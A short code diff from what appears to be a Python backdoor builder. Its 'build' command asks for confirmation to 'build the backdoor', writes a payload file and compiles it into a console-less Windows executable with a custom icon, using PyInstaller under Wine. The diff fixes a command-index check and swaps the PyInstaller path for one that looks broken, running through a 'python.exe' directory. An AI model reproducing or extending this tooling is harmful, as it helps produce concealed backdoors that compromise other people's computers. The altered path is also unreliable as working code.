@@ -213,7 +213,7 @@ try:
                 else:
                     print("[!] Invalid command!\n")
 
-        elif command_list[1] == "build":
+        elif command_list[0] == "build":
             print("[?] Are you sure you want to build the backdoor? (y/n)")
             input = input()
             if input == "y":
@@ -246,7 +246,7 @@ try:
                 f.write(newfile)
                 f.close()
                 
-                path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
+                path_to_pyinstaller = os.path.expanduser('~/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/python.exe/Scripts/pyinstaller.exe')
                 if "Arch" in distro.name() or "Manjaro" in distro.name():
                     path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
                 compile_command = ["wine", path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", list[0]+".py"]
